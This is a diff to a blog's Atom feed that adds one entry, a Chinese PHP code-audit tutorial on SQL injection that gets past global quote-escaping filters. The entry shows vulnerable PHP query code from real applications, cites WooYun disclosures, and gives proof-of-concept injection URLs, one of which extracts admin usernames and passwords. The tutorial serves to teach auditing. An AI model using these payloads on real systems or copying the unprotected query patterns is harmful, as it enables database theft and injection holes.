@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.cnbraid.com/"/>
-  <updated>2016-02-29T01:58:09.795Z</updated>
+  <updated>2016-04-29T10:20:31.330Z</updated>
   <id>http://www.cnbraid.com/</id>
   
   <author>
@@ -14,6 +14,63 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 6.全局防护盲点的总结前篇</title>
+    <link href="http://www.cnbraid.com/2016/03/05/sql5/"/>
+    <id>http://www.cnbraid.com/2016/03/05/sql5/</id>
+    <published>2016-03-05T02:35:00.000Z</published>
+    <updated>2016-04-29T10:20:31.330Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，比如最经典的整型参数传递，也即被带入数据库查询的参数是整型、数组中的key没过滤被带入了查询以及全局过滤了GET、POST但没过滤SERVER或COOKIE引发的注入。所以看似有全局防护，实则隐藏了很多“后门”～&lt;br&gt;&lt;strong&gt;盲点如下：&lt;/strong&gt;&lt;br&gt;①注入点类似id=1这种整型的参数就会完全无视GPC的过滤；&lt;br&gt;②注入点包含键值对的，那么这里只检测了value，对key的过滤就没有防护；&lt;br&gt;③有时候全局的过滤只过滤掉GET、POST和COOKIE，但是没过滤SERVER。&lt;br&gt;附常见的SERVER变量（具体含义自行百度）：QUERY_STRING,X_FORWARDED_FOR,CLIENT_IP,HTTP_HOST,ACCEPT_LANGUAGE&lt;br&gt;思路来源于乌云drops&lt;a href=&quot;http://drops.wooyun.org/papers/4544&quot; target=&quot;_blank&quot;&gt;http://drops.wooyun.org/papers/4544&lt;/a&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;环境请自行搜寻和搭建吧，从这篇开始只做分析不提供漏洞测试环境~~&lt;/p&gt;
+&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;首先是完全无视GPC的数字型的注入，其实仔细总结下发现还是很多可以学习的地方。&quot;&gt;首先是&lt;strong&gt;完全无视GPC的数字型的注入&lt;/strong&gt;，其实仔细总结下发现还是很多可以学习的地方。&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;A.传入的参数未做intval转换、构造的sql语句没有单引号保护&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这个还是比较常见的，当初笔者挖到过一些，乌云案例&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-065605&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-065605&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+require_once &lt;span class=&quot;string&quot;&gt;&quot;admin/common.php&quot;&lt;/span&gt;;
+require_once(MOBAN_PATH_QZ.&lt;span class=&quot;string&quot;&gt;&quot;header.html&quot;&lt;/span&gt;);
+//这里typeid没有做整形转换
+&lt;span class=&quot;variable&quot;&gt;$typeid&lt;/span&gt;=isset($_GET[&lt;span class=&quot;string&quot;&gt;&#39;typeid&#39;&lt;/span&gt;]) ? $_GET[&lt;span class=&quot;string&quot;&gt;&#39;typeid&#39;&lt;/span&gt;] : &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;
+//sql语句没有单引号保护
+&lt;span class=&quot;variable&quot;&gt;$type&lt;/span&gt;=&lt;span class=&quot;variable&quot;&gt;$db-&lt;/span&gt;&amp;gt;fetch_array(mysql_query(&lt;span class=&quot;variable&quot;&gt;$sql&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;select * from &quot;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$db-&lt;/span&gt;&amp;gt;tablepre.&lt;span class=&quot;string&quot;&gt;&quot;newstype where newstypeid=&quot;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$typeid&lt;/span&gt;));//typeid参数存在注入，数字型；
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取管理员账户密码的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/jdy1.5/typeid.php?typeid=1 and 1=2 UNION &lt;span class=&quot;operator&quot;&gt;SELECT &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,(select &lt;span class=&quot;keyword&quot;&gt;concat&lt;/span&gt;(username,&lt;span class=&quot;number&quot;&gt;0x23&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;password&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; jdy_admin &lt;span class=&quot;keyword&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql5_01.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;B.同一参数在第一个sql里做了单引号保护，紧跟第二个忘记加单引号 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;有幸在Discuz!上看到此类问题，膜拜下雨牛的漏洞&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-079045&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2014-079045&lt;/a&gt;&lt;br&gt;简单分析下漏洞原理&lt;br&gt;首先$itemid经过的第一条SQL语句如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;variable&quot;&gt;$query&lt;/span&gt; = $_SGLOBAL[&lt;span class=&quot;string&quot;&gt;&#39;db&#39;&lt;/span&gt;]-&amp;gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;string&quot;&gt;&#39;SELECT * FROM &#39;&lt;/span&gt;.tname(&lt;span class=&quot;string&quot;&gt;&#39;spacetags&#39;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39; WHERE itemid=\&#39;&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$itemid&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;\&#39; AND status=\&#39;&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$status&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;\&#39;&#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;$itemid是有单引号保护的并且做了select查询，如果查询有结果才会带入到delete中，如果无结果就不执行delete。在数据库里itemid是int类型存储的，所以这里本意是只能提交数字型才能查询出结果，如果不是提交的数字的话那么就查询不出来结果，就不去执行下面的delete语句了。但是由于mysql的类型转换，因为这里储存的是int类型，所以1xxxxx跟1的查询结果是一样的，如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql5_02.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;然后后面第二条delete的sql语句如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$_SGLOBAL[&lt;span class=&quot;string&quot;&gt;&#39;db&#39;&lt;/span&gt;]-&amp;gt;query(&lt;span class=&quot;string&quot;&gt;&#39;DELETE FROM &#39;&lt;/span&gt;.tname(&lt;span class=&quot;string&quot;&gt;&#39;spacetags&#39;&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&#39; WHERE itemid=&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$itemid&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39; AND tagid IN (&#39;&lt;/span&gt;.simplode(&lt;span class=&quot;variable&quot;&gt;$deletetagidarr&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&#39;) AND status=\&#39;&#39;.$status.&#39;&lt;/span&gt;\&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里忘记加单引号了，根据上图我们可以构造获取数据库用户的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;label&quot;&gt;http&lt;/span&gt;://localhost/sup/dan/supesite/&lt;span class=&quot;preprocessor&quot;&gt;cp&lt;/span&gt;.php?ac&lt;span class=&quot;label&quot;&gt;=news&lt;/span&gt;&amp;amp;op&lt;span class=&quot;label&quot;&gt;=view&lt;/span&gt;&amp;amp;&lt;span class=&quot;keyword&quot;&gt;itemid=4 &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;and &lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=(updatexml(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,concat()))
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql5_03.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;C.php弱类型语言,判断逻辑错误引发注入&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;还是雨牛的案例&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-088872&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-088872&lt;/a&gt;&lt;br&gt;这里只讲下漏洞形成的原理&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql5_03.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;如上图，弱类型语言在逻辑判断上0&amp;lt;1和0 union select 1&amp;lt;1是等价的，都返回True。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，比如最经典的整型参数传递，也即被带入数据库查询的参数是整型、数组中的key没过滤被带入了查询以及全局过滤了GET、POST但没过滤SERVER或COOKIE引发的注入。所以看似有全局防护，实则隐藏了很多“后门”～&lt;br&gt;&lt;strong&gt;盲点如下：&lt;/strong&gt;&lt;br&gt;①注入点类似id=1这种整型的参数就会完全无视GPC的过滤；&lt;br&gt;②注入点包含键值对的，那么这里只检测了value，对key的过滤就没有防护；&lt;br&gt;③有时候全局的过滤只过滤掉GET、POST和COOKIE，但是没过滤SERVER。&lt;br&gt;附常见的SERVER变量（具体含义自行百度）：QUERY_STRING,X_FORWARDED_FOR,CLIENT_IP,HTTP_HOST,ACCEPT_LANGUAGE&lt;br&gt;思路来源于乌云drops&lt;a href=&quot;http://drops.wooyun.org/papers/4544&quot; target=&quot;_blank&quot;&gt;http://drops.wooyun.org/papers/4544&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://www.cnbraid.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="PHP" scheme="http://www.cnbraid.com/tags/PHP/"/>
+    
+      <category term="SQL注入" scheme="http://www.cnbraid.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="代码审计" scheme="http://www.cnbraid.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 5.全局防护Bypass之宽字节注入</title>
